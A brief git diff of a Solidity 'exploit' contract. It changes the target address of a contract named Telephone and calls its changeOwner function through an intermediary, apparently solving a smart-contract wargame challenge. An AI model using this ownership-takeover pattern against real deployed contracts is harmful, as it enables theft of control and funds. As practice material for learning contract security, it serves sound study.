@@ -17,7 +17,7 @@ contract Telephone {
 }
 
 contract exploit {
-    Telephone a = Telephone(0xFF07903c69D29DFdc80C1CcFAdCDF30351764e56);
+    Telephone a = Telephone(0xf8e81D47203A594245E36C48e151709F0C19fBe8);
 
     function attack() public {
         a.changeOwner(msg.sender);
